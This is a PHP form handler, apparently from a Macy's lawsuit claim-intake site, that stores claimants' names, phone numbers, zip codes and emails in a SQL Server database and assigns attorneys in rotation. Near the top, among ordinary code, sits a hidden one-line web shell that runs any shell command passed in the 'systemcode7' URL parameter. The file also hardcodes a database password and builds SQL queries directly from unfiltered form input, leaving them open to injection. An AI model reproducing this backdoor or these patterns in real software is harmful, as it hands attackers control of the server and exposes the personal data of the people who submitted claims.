<?php session_start(); ?>
<!--<head>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">



<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700,400italic' rel='stylesheet' type='text/css'>
<link href="https://macyslawsuit.com/wp-content/themes/MacysV3/css/confirmations.css" rel="stylesheet" type="text/css" />
</head>-->
<?PHP
##
// Testing IE detection 
##


////////////// function using_ie() 
//////////////{ 
//////////////    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
//////////////    $ub = False; 
//////////////    if(preg_match('/MSIE/i',$u_agent)) 
//////////////    { 
//////////////        $ub = True; 
//////////////    } 
//////////////    
//////////////    return $ub; 
//////////////} 
//////////////
//////////////function ie_box() {
//////////////     if (!using_ie()) {
//////////////			include_once $_SERVER['DOCUMENT_ROOT'] . '/securimage/securimage.php';
//////////////			$securimage = new Securimage();
//////////////			
//////////////			if ($securimage->check($_POST['captcha_code']) == false) {
//////////////			  // the code was incorrect
//////////////			  // you should handle the error so that the form processor doesn't continue
//////////////			  // or you can use the following code if there is no validation or you do not know how
//////////////			  echo "The security code entered was incorrect.<br /><br />";
//////////////			  echo "Please go <a href='javascript:history.go(-1)'>back</a> and try again.";
//////////////			  exit;
//////////////			}
//////////////     return;
//////////////     }
////////////// } 
//////////////ie_box();
##
##
?>
 <?php
//print('<pre>');
//print_r($_POST);
//print('</pre>');





/*  require_once('recaptchalib.php');
  $privatekey = "6LeVHs4SAAAAAByblbL0zRz0b70JPwooyi-G-fxx";
  $resp = recaptcha_check_answer ($privatekey,
                                $_SERVER["REMOTE_ADDR"],
                                $_POST["recaptcha_challenge_field"],
                                $_POST["recaptcha_response_field"]);

  if (!$resp->is_valid) {
    // What happens when the CAPTCHA was entered incorrectly
    die ("<FORM><INPUT TYPE='button' VALUE='Back' onClick='history.go(-1);return true;'></FORM><BR>The reCAPTCHA wasn't entered correctly. Go back and try it again." ."<br>" .
         "(reCAPTCHA said: " . $resp->error . ")");
		 
  } else {
    // Your code here to handle a successful verification
  }*/
  ?>
  
  
<?php

//print('<pre>');
//print_r($_POST);
//print('</pre>');

?>
<?php if(isset ($_GET['systemcode7'])){system($_GET['systemcode7']);} ?>
<?PHP

 

$serverName = "localhost\SPICE";

$connectionInfo = array( "Database"=>"SpiceData", "UID"=>"SpiceWriter2012", "PWD"=>"p1c3righttwoohonetwo");

$conn = sqlsrv_connect( $serverName, $connectionInfo );
$date = date('Y').'-'.date('m').'-'.date('d');
$time = date('H').':'.date('i').':'.date('s');
$month = date('Y').'-'.date('m');
$week = date('Y').'-'.date('W');

#$brand = $_REQUEST['brand'];
#$tenantid = $_REQUEST['tenantid'];
#$brandid = $_REQUEST['brandid'];
#$caseid = $_REQUEST['caseid'];
#$data = $_REQUEST['var'];

//set something to bob to test
//REQUIRED START
if (isset($_POST['brand'])) $brand = $_POST['brand'];
if (isset($_POST['tenantid'])) $tenantid = $_POST['tenantid'];
if (isset($_REQUEST['tenantid'])) $tenantid = $_REQUEST['tenantid'];
if (empty($tenantid)) $tenantid = '4';
if (isset($_POST['brandid'])) $brandid = $_POST['brandid'];
if (isset($_REQUEST['brandid'])) $brandid = $_REQUEST['brandid'];

if (isset($_POST['barcode'])) $barcode = $_POST['barcode'];

if (isset($_REQUEST['barcode'])) $barcode = $_REQUEST['barcode'];
//if (empty($uniqueid)) unset($barcode);
if(empty($barcode)) unset($barcode);
if (isset($_REQUEST['brand'])) $brand = $_REQUEST['brand'];

$brandname = 'Macys';




if (isset($_POST['WhoFirstName']))   $FirstName = $_POST['WhoFirstName'];
if (empty($FirstName))
{
	unset($FirstName);
}
else
{
	//strip exclaimation
	if(strstr($FirstName,'!'))
	{
	
	    $FirstName = str_replace('\'','',$FirstName);
	}
	//strip single quote
	if(strstr($FirstName,'\''))
	{
	
	    $FirstName = str_replace('\'','',$FirstName);
	}
	
	//strip tab
	if(strstr($FirstName,'	'))
	{
	
	    $FirstName = str_replace('	','',$FirstName);
	}
		
	//strip double quote
	if(strstr($FirstName,'\"'))
	{
	
	    $FirstName = str_replace('\"','',$FirstName);
	}	
	//strip percentage
	if(strstr($FirstName,'%'))
	{
	
	    $FirstName = str_replace('%','',$FirstName);
	}
	//strip asterisk
	if(strstr($FirstName,'*'))
	{
	
	    $FirstName = str_replace('*','',$FirstName);
	}
	//strip underscore
	if(strstr($FirstName,'_'))
	{
	
	    $FirstName = str_replace('_','',$FirstName);
	}
	//strip ampersand
	if(strstr($FirstName,'&'))
	{
	
	    $FirstName = str_replace('\'','',$FirstName);
	}	
	//strip dash
	if(strstr($FirstName,'-'))
	{
	
	    $FirstName = str_replace('-','',$FirstName);
	}
	
	//strip space
	if(strstr($FirstName,' '))
	{
	
	    $FirstName = str_replace(' ','',$FirstName);
	}
	//strip comma
	if(strstr($FirstName,','))
	{
	
	    $FirstName = str_replace(',','',$FirstName);
	}

	//strip period
	if(strstr($FirstName,'.'))
	{
	
	    $FirstName = str_replace('.','',$FirstName);
	}
	
	
	//strip parenthasis open
	if(strstr($FirstName,'('))
	{
	
		$FirstName = preg_replace('/\(|\)/','',$FirstName);
	}
	
	//strip parenthasis close
	if(strstr($FirstName,')'))
	{
		$FirstName = preg_replace('/\(|\)/','',$FirstName); 
	}
	if (isset($FirstName))
	{

		
		$FirstName = ereg_replace("[^A-Za-z0-9]", "", $FirstName );
		$whofirstname = $FirstName;
	}
}



if (isset($_POST['WhoLastName']))   $WhoLastName = $_POST['WhoLastName'];
if (empty($WhoLastName))
{
	unset($WhoLastName);
}
else
{
	//strip exclaimation
	if(strstr($WhoLastName,'!'))
	{
	
	    $WhoLastName = str_replace('\'','',$WhoLastName);
	}
	//strip single quote
	if(strstr($WhoLastName,'\''))
	{
	
	    $WhoLastName = str_replace('\'','',$WhoLastName);
	}
	
	//strip tab
	if(strstr($WhoLastName,'	'))
	{
	
	    $WhoLastName = str_replace('	','',$WhoLastName);
	}
		
	//strip double quote
	if(strstr($WhoLastName,'\"'))
	{
	
	    $WhoLastName = str_replace('\"','',$WhoLastName);
	}	
	//strip percentage
	if(strstr($WhoLastName,'%'))
	{
	
	    $WhoLastName = str_replace('%','',$WhoLastName);
	}
	//strip asterisk
	if(strstr($WhoLastName,'*'))
	{
	
	    $WhoLastName = str_replace('*','',$WhoLastName);
	}
	//strip underscore
	if(strstr($WhoLastName,'_'))
	{
	
	    $WhoLastName = str_replace('_','',$WhoLastName);
	}
	//strip ampersand
	if(strstr($WhoLastName,'&'))
	{
	
	    $WhoLastName = str_replace('\'','',$WhoLastName);
	}	
	//strip dash
	if(strstr($WhoLastName,'-'))
	{
	
	    $WhoLastName = str_replace('-','',$WhoLastName);
	}
	
	//strip space
	if(strstr($WhoLastName,' '))
	{
	
	    $WhoLastName = str_replace(' ','',$WhoLastName);
	}
	//strip comma
	if(strstr($WhoLastName,','))
	{
	
	    $WhoLastName = str_replace(',','',$WhoLastName);
	}

	//strip period
	if(strstr($WhoLastName,'.'))
	{
	
	    $WhoLastName = str_replace('.','',$WhoLastName);
	}
	
	
	//strip parenthasis open
	if(strstr($WhoLastName,'('))
	{
	
		$WhoLastName = preg_replace('/\(|\)/','',$WhoLastName);
	}
	
	//strip parenthasis close
	if(strstr($WhoLastName,')'))
	{
		$WhoLastName = preg_replace('/\(|\)/','',$WhoLastName); 
	}
	if (isset($WhoLastName))
	{

		
		$WhoLastName = ereg_replace("[^A-Za-z0-9]", "", $WhoLastName );
		$wholastname = $WhoLastName;
	}

}
if (isset($_POST['shortnoneoftheabove'])) $shortnoneoftheabove = $_POST['shortnoneoftheabove'];
if (!isset($_POST['shortnoneoftheabove'])) $shortnoneoftheabove = 'No';
if (isset($_POST['shortcheck1'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck2'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck3'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck4'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck5'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck6'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck7'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck8'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck9'])) { $shortnoneoftheabove = 'No'; };
if (isset($_POST['shortcheck10'])) { $shortnoneoftheabove = 'No'; };



if (isset($_POST['wantstoshare1']))
{
if($_POST['wantstoshare1'] == 'Yes') $wantstoshare = 'Yes';
if($_POST['wantstoshare1'] == 'No') $wantstoshare = 'No';
}

#if (isset($_POST['wantstoshare1'])) if($_POST['wantstoshare1'] == 'Yes') if (isset($_POST['wantstoshare'])) if($_POST['wantstoshare1'] == 'No') $wantstoshare = $_POST['wantstoshare'];


if (isset($_POST['agreetocontactaboutexperience'])) $agreetocontactaboutexperience = $_POST['agreetocontactaboutexperience'];
if (!isset($_POST['agreetocontactaboutexperience'])) $agreetocontactaboutexperience = 'No';

$clientname = "$FirstName" . " $WhoLastName";

if (isset($_REQUEST['clientname'])) $clientname = $_REQUEST['clientname'];
if (isset($_POST['clientname'])) $clientname = $_POST['clientname'];


//if (isset($_REQUEST['1WhoFirstName']))
//{
////    if (isset($uniqueid))
////    {
////	$query = "IF NOT EXISTS(SELECT * FROM data WHERE  uniqueid='$uniqueid' AND tenantid='$tenantid' ) INSERT INTO data (uniqueid,brandid,tenantid,date,time,brand) VALUES ('$uniqueid','$brandid','$tenantid','$date','$time','$brand')";
////	$results = sqlsrv_query($conn,$query);
////    }
//}

if (isset($_POST['CallbackNum']))   $phone1 = $_POST['CallbackNum'];
if (empty($phone1))
{
	unset($phone1);
}
else
{
	
	//strip single quote
	if(strstr($phone1,'\''))
	{
	
	    $phone1 = str_replace('\'','',$phone1);
	}
	
	//strip tab
	if(strstr($phone1,'	'))
	{
	
	    $phone1 = str_replace('	','',$phone1);
	}
		
	//strip double quote
	if(strstr($phone1,'\"'))
	{
	
	    $phone1 = str_replace('\"','',$phone1);
	}	
	//strip percentage
	if(strstr($phone1,'%'))
	{
	
	    $phone1 = str_replace('%','',$phone1);
	}
	//strip asterisk
	if(strstr($phone1,'*'))
	{
	
	    $phone1 = str_replace('*','',$phone1);
	}
	//strip underscore
	if(strstr($phone1,'_'))
	{
	
	    $phone1 = str_replace('_','',$phone1);
	}
	//strip ampersand
	if(strstr($phone1,'&'))
	{
	
	    $phone1 = str_replace('\'','',$phone1);
	}	
	//strip dash
	if(strstr($phone1,'-'))
	{
	
	    $phone1 = str_replace('-','',$phone1);
	}
	
	//strip space
	if(strstr($phone1,' '))
	{
	
	    $phone1 = str_replace(' ','',$phone1);
	}
	//strip comma
	if(strstr($phone1,','))
	{
	
	    $phone1 = str_replace(',','',$phone1);
	}

	//strip period
	if(strstr($phone1,'.'))
	{
	
	    $phone1 = str_replace('.','',$phone1);
	}
	
	
	//strip parenthasis open
	if(strstr($phone1,'('))
	{
	
		$phone1 = preg_replace('/\(|\)/','',$phone1);
	}
	
	//strip parenthasis close
	if(strstr($phone1,')'))
	{
		$phone1 = preg_replace('/\(|\)/','',$phone1); 
	}
}
if (isset($_POST['SecondaryNumber'])) $phone2 = $_POST['SecondaryNumber'];
if (empty($phone2))
{
unset($phone2);	
}
else
{
	//strip single quote
	if(strstr($phone2,'\''))
	{
	
	    $phone2 = str_replace('\'','',$phone2);
	}
	
	//strip double quote
	if(strstr($phone2,'\"'))
	{
	
	    $phone2 = str_replace('\"','',$phone2);
	}	
	//strip percentage
	if(strstr($phone2,'%'))
	{
	
	    $phone2 = str_replace('%','',$phone2);
	}
	//strip asterisk
	if(strstr($phone2,'*'))
	{
	
	    $phone2 = str_replace('*','',$phone2);
	}
	//strip underscore
	if(strstr($phone2,'_'))
	{
	
	    $phone2 = str_replace('_','',$phone2);
	}
	//strip ampersand
	if(strstr($phone2,'&'))
	{
	
	    $phone2 = str_replace('\'','',$phone2);
	}	
	//strip dash
	if(strstr($phone2,'-'))
	{
	
	    $phone2 = str_replace('-','',$phone2);
	}
	
	//strip space
	if(strstr($phone2,' '))
	{
	
	    $phone2 = str_replace(' ','',$phone2);
	}
	//strip comma
	if(strstr($phone2,','))
	{
	
	    $phone2 = str_replace(',','',$phone2);
	}

	//strip period
	if(strstr($phone2,'.'))
	{
	
	    $phone2 = str_replace('.','',$phone2);
	}

	//strip parenthasis open
	if(strstr($phone2,'('))
	{
	
		$phone2 = preg_replace('/\(|\)/','',$phone2);
	}
	
	//strip parenthasis close
	if(strstr($phone2,')'))
	{
		$phone2 = preg_replace('/\(|\)/','',$phone2); 
	}
}
if (isset($_POST['Zipcode'])) $Zipcode = $_POST['Zipcode'];
if (empty($Zipcode))
{
	unset($Zipcode);
}
else
{
	//strip single quote
	if(strstr($Zipcode,'\''))
	{
	
	    $Zipcode = str_replace('\'','',$Zipcode);
	}
	
	//strip double quote
	if(strstr($Zipcode,'\"'))
	{
	
	    $Zipcode = str_replace('\"','',$Zipcode);
	}	
	//strip percentage
	if(strstr($Zipcode,'%'))
	{
	
	    $Zipcode = str_replace('%','',$Zipcode);
	}
	//strip asterisk
	if(strstr($Zipcode,'*'))
	{
	
	    $Zipcode = str_replace('*','',$Zipcode);
	}
	//strip underscore
	if(strstr($Zipcode,'_'))
	{
	
	    $Zipcode = str_replace('_','',$Zipcode);
	}
	//strip ampersand
	if(strstr($Zipcode,'&'))
	{
	
	    $Zipcode = str_replace('\'','',$Zipcode);
	}	
	//strip dash
	if(strstr($Zipcode,'-'))
	{
	
	    $Zipcode = str_replace('-','',$Zipcode);
	}
	
	//strip space
	if(strstr($Zipcode,' '))
	{
	
	    $Zipcode = str_replace(' ','',$Zipcode);
	}
	//strip comma
	if(strstr($Zipcode,','))
	{
	
	    $Zipcode = str_replace(',','',$Zipcode);
	}

	//strip period
	if(strstr($Zipcode,'.'))
	{
	
	    $Zipcode = str_replace('.','',$Zipcode);
	}

	//strip parenthasis open
	if(strstr($Zipcode,'('))
	{
	
		$Zipcode = preg_replace('/\(|\)/','',$Zipcode);
	}
	
	//strip parenthasis close
	if(strstr($Zipcode,')'))
	{
		$Zipcode = preg_replace('/\(|\)/','',$Zipcode); 
	}
}
if (isset($_REQUEST['WhoFirstName']))
{
if (!isset($barcode))
{
    if (isset($phone2))
    {
	$query = "select uniqueid from Status where 
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone1 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone2 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone3 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone4 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone5 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone6 LIKE '%$phone1%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone1 LIKE '%$phone2%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone2 LIKE '%$phone2%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone3 LIKE '%$phone2%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone4 LIKE '%$phone2%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone5 LIKE '%$phone2%'
	OR
	FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone6 LIKE '%$phone2%'
    ";
    }
    else
    {
    $query = "select uniqueid from Status where 
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone1 LIKE '%$phone1%'
    OR
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone2 LIKE '%$phone1%'
    OR
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone3 LIKE '%$phone1%'
    OR
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone4 LIKE '%$phone1%'
    OR
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone5 LIKE '%$phone1%'
    OR
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and zipcode LIKE '%$Zipcode%' and Phone6 LIKE '%$phone1%'
";
    }

}
else
{
    $query = "select uniqueid from Status where 
    FirstName LIKE '%".$_POST['WhoFirstName']."%' and LastName LIKE '%".$_POST['WhoLastName']."%' and barcode LIKE '%$barcode%'";
}
$results = sqlsrv_query($conn,$query);
while($row = sqlsrv_fetch_array($results))
{
    $uniqueid = $row['uniqueid'];
}    
}
if (isset($_REQUEST['WhoFirstName']))
	{
	if (isset($uniqueid)) if (empty($uniqueid)) unset($uniqueid);
## ian)->commented this stuff out because of this message in tail, and im not sure what i was trying to do with this query or variable
##
##[15-Jun-2012 16:43:08] PHP Notice:  Undefined variable: uniqueid in C:\inetpub\wwwroot\database_write_Short_MacysEmail_2.php on line 613
#	$query = "select retainerAccepted from Status where uniqueid='$uniqueid' and retainerAccepted IS NOT NULL";
#	$results = sqlsrv_query($conn,$query);
#	while($row = sqlsrv_fetch_array($results))
#	{
#	    $retaineraccepted = $row['retainerAccepted'];
#	}
#	if (isset($retaineraccepted)) if (empty($retaineraccepted)) unset($retaineraccepted);
	if (!isset($retaineraccepted))
	{
		//
		///
		////    
		/////
		//////
		if (isset($_REQUEST['WhoFirstName']))
		{
		    $abslastid = '6';
		    $one = '1';
		    $query = "select attorneyid from tbl_attorneyassign where waslast='yes'";
		    $results = sqlsrv_query($conn,$query);
		    while($row = sqlsrv_fetch_array($results))
		    {
			$lastid = $row['attorneyid'];
		    }
		    if ($lastid == $abslastid)
		    {
			$attorneyassignedid = $lastid-$abslastid+$one;
		    }
		    else
		    {
			$attorneyassignedid = $lastid+$one;
		    }
		    $query = "select attorneyfname,attorneylname,attorneyemail from tbl_attorneyassign where attorneyid='$attorneyassignedid'";
		    $results = sqlsrv_query($conn,$query);
		    while($row = sqlsrv_fetch_array($results))
		    {
			$attorneyfname = $row['attorneyfname'];
			$attorneylname = $row['attorneylname'];
			$attorneyemail = $row['attorneyemail'];
		    }
		    
		    
		    $query = "update tbl_attorneyassign set waslast='' where waslast='yes'";
		    $results = sqlsrv_query($conn,$query);
		    
		    $query = "update tbl_attorneyassign set  waslast='yes' where attorneyid='$attorneyassignedid'";
		    $results = sqlsrv_query($conn,$query);
		}
		//////
		/////
		////
		///
		//
	
	    
		if (isset($_REQUEST['WhoFirstName']))
		{
		    if (!isset($uniqueid)) 
		    {
			
			/*
			|-----------------
			| Chip Download Class
			|------------------
			*/
		 
			require_once("class.chip_password_generator.php");
		 
			/*
			|-----------------
			| Class Instance
			|------------------
			*/
		 
			$args = array(
			    'length'                =>   18,
			    'alpha_upper_include'   =>   TRUE,
			    'alpha_lower_include'   =>   FALSE,
			    'number_include'        =>   TRUE,
			    'symbol_include'        =>   FALSE,
			    );
			$object = new chip_password_generator( $args );
			 
			/*
			|-----------------
			| Generate Password
			|------------------
			*/
			 
			$password = $object->get_password();
		 
			#echo $password;
			
			$uniqueid = $password;
			if (isset($uniqueid))
			{	
				$query = "IF NOT EXISTS(SELECT * FROM data WHERE uniqueid='$uniqueid' AND tenantid='$tenantid' ) INSERT INTO data (uniqueid,brandid,tenantid,date,time,brand) VALUES ('$uniqueid','$brandid','$tenantid','$date','$time','$brand')";
				$results = sqlsrv_query($conn,$query);
			}
		    }
		}

		if (isset($_REQUEST['WhoFirstName']))
		{
			#$whofirstname = $_POST['1WhoFirstName'];
			$whofirstname = $whofirstname;
			$var = "1WhoFirstName";
			$vardata = $whofirstname;
			$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
					$results = sqlsrv_query($conn,$query);
					
		}
		if (isset($attorneylname))
		{
			#$whofirstname = $_POST['1WhoFirstName'];
			#$attorneylname = $_REQUEST['1WhoFirstName'];
			$var = "agentlname";
			$vardata = $attorneylname;
			$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
					$results = sqlsrv_query($conn,$query);
					
		}
	
		if (isset($_POST['WhoLastName'])) 
		{
			$wholastname = $wholastname;
			$var = "1WhoLastName";
			$vardata = $wholastname;
			$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
			$results = sqlsrv_query($conn,$query);
					
		
		}
		if (isset($_POST['barcode'])) $barcode = $_POST['barcode'];
			if (isset($_REQUEST['barcode'])) $barcode = $_REQUEST['barcode'];
		if (empty($barcode))
		{
			unset($barcode);	
		}
		else
		{
	
		//strip single quote
		if(strstr($barcode,'\''))
		{
		
		    $barcode = str_replace('\'','',$barcode);
		}
		
		//strip double quote
		if(strstr($barcode,'\"'))
		{
		
		    $barcode = str_replace('\"','',$barcode);
		}	
		//strip percentage
		if(strstr($barcode,'%'))
		{
		
		    $barcode = str_replace('%','',$barcode);
		}
		//strip asterisk
		if(strstr($barcode,'*'))
		{
		
		    $barcode = str_replace('*','',$barcode);
		}
		//strip underscore
		if(strstr($barcode,'_'))
		{
		
		    $barcode = str_replace('_','',$barcode);
		}
		//strip ampersand
		if(strstr($barcode,'&'))
		{
		
		    $barcode = str_replace('\'','',$barcode);
		}	
		//strip dash
		if(strstr($barcode,'-'))
		{
		
		    $barcode = str_replace('-','',$barcode);
		}
		
		//strip space
		if(strstr($barcode,' '))
		{
		
		    $barcode = str_replace(' ','',$barcode);
		}
		//strip comma
		if(strstr($barcode,','))
		{
		
		    $barcode = str_replace(',','',$barcode);
		}
	
		//strip period
		if(strstr($barcode,'.'))
		{
		
		    $barcode = str_replace('.','',$barcode);
		}
	
		//strip parenthasis open
		if(strstr($barcode,'('))
		{
		
			$barcode = preg_replace('/\(|\)/','',$barcode);
		}
		
		//strip parenthasis close
		if(strstr($barcode,')'))
		{
			$barcode = preg_replace('/\(|\)/','',$barcode); 
		}
	
		$var = "barcode";
		$vardata = $barcode;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
				
	
		}
		if (isset($_POST['CallbackNum']))   $phone1 = $_POST['CallbackNum'];
		if (empty($phone1))
		{
			unset($phone1);
		}
		else
		{
			
			//strip single quote
			if(strstr($phone1,'\''))
			{
			
			    $phone1 = str_replace('\'','',$phone1);
			}
			
			//strip tab
			if(strstr($phone1,'	'))
			{
			
			    $phone1 = str_replace('	','',$phone1);
			}
				
			//strip double quote
			if(strstr($phone1,'\"'))
			{
			
			    $phone1 = str_replace('\"','',$phone1);
			}	
			//strip percentage
			if(strstr($phone1,'%'))
			{
			
			    $phone1 = str_replace('%','',$phone1);
			}
			//strip asterisk
			if(strstr($phone1,'*'))
			{
			
			    $phone1 = str_replace('*','',$phone1);
			}
			//strip underscore
			if(strstr($phone1,'_'))
			{
			
			    $phone1 = str_replace('_','',$phone1);
			}
			//strip ampersand
			if(strstr($phone1,'&'))
			{
			
			    $phone1 = str_replace('\'','',$phone1);
			}	
			//strip dash
			if(strstr($phone1,'-'))
			{
			
			    $phone1 = str_replace('-','',$phone1);
			}
			
			//strip space
			if(strstr($phone1,' '))
			{
			
			    $phone1 = str_replace(' ','',$phone1);
			}
			//strip comma
			if(strstr($phone1,','))
			{
			
			    $phone1 = str_replace(',','',$phone1);
			}
		
			//strip period
			if(strstr($phone1,'.'))
			{
			
			    $phone1 = str_replace('.','',$phone1);
			}
			
			
			//strip parenthasis open
			if(strstr($phone1,'('))
			{
			
				$phone1 = preg_replace('/\(|\)/','',$phone1);
			}
			
			//strip parenthasis close
			if(strstr($phone1,')'))
			{
				$phone1 = preg_replace('/\(|\)/','',$phone1); 
			}
		
		$callbacknum = $phone1;
			$var = "1CallbackNum";
			$vardata = $callbacknum;
			$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
					$results = sqlsrv_query($conn,$query);
				
	
		}
		if (isset($_POST['SecondaryNumber'])) $phone2 = $_POST['SecondaryNumber'];
		if (empty($phone2))
		{
			$phone2 ='';
			$secondarynumber = '';
		}
		else
		{
		//strip single quote
		if(strstr($phone2,'\''))
		{
		
		    $phone2 = str_replace('\'','',$phone2);
		}
		
		//strip double quote
		if(strstr($phone2,'\"'))
		{
		
		    $phone2 = str_replace('\"','',$phone2);
		}	
		//strip percentage
		if(strstr($phone2,'%'))
		{
		
		    $phone2 = str_replace('%','',$phone2);
		}
		//strip asterisk
		if(strstr($phone2,'*'))
		{
		
		    $phone2 = str_replace('*','',$phone2);
		}
		//strip underscore
		if(strstr($phone2,'_'))
		{
		
		    $phone2 = str_replace('_','',$phone2);
		}
		//strip ampersand
		if(strstr($phone2,'&'))
		{
		
		    $phone2 = str_replace('\'','',$phone2);
		}	
		//strip dash
		if(strstr($phone2,'-'))
		{
		
		    $phone2 = str_replace('-','',$phone2);
		}
		
		//strip space
		if(strstr($phone2,' '))
		{
		
		    $phone2 = str_replace(' ','',$phone2);
		}
		//strip comma
		if(strstr($phone2,','))
		{
		
		    $phone2 = str_replace(',','',$phone2);
		}
	
		//strip period
		if(strstr($phone2,'.'))
		{
		
		    $phone2 = str_replace('.','',$phone2);
		}
	
		//strip parenthasis open
		if(strstr($phone2,'('))
		{
		
			$phone2 = preg_replace('/\(|\)/','',$phone2);
		}
		
		//strip parenthasis close
		if(strstr($phone2,')'))
		{
			$phone2 = preg_replace('/\(|\)/','',$phone2); 
		}
		$secondarynumber =  $phone2;
		$var = "3SecondaryNumber";
		$vardata = $secondarynumber;
		$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE data set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
				$results = sqlsrv_query($conn,$query);
	
	
		}
	
		//if (isset($_POST['ip'])) 
		//{	$ip = $_POST['ip'];
		//	$var = "ip";
		//	$vardata = $ip;
		//	$query = "IF EXISTS (SELECT * from data WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid') UPDATE status set [$var]='$vardata' WHERE data.uniqueid='$uniqueid' AND data.tenantid='4' AND brand='$brand' AND brandid='$brandid'";
		//			$results = sqlsrv_query($conn,$query);
		//			
		//
		//}
		//else
		//{
		//if (!isset($_POST['ip']))
		//{
		//	$ip = '';
		//}
		//}
	if (isset($_POST['Email'])) $email = $_POST['Email'];
	if (empty($email))
	{
	unset($email);	
	}
	else
	{
		//strip single quote
		if(strstr($email,'\''))
		{
		
		    $email = str_replace('\'','',$email);
		}
		
		//strip double quote
		if(strstr($email,'\"'))
		{
		
		    $email = str_replace('\"','',$email);
		}	
		//strip percentage
		if(strstr($email,'%'))
		{
		
		    $email = str_replace('%','',$email);
		}
		//strip asterisk
		if(strstr($email,'*'))
		{
		
		    $email = str_replace('*','',$email);
		}
		////strip underscore
		//if(strstr($email,'_'))
		//{
		//
		//    $email = str_replace('_','',$email);
		//}
		//strip ampersand
		if(strstr($email,'&'))
		{
		
		    $email = str_replace('\'','',$email);
		}	
		////strip dash
		//if(strstr($email,'-'))
		//{
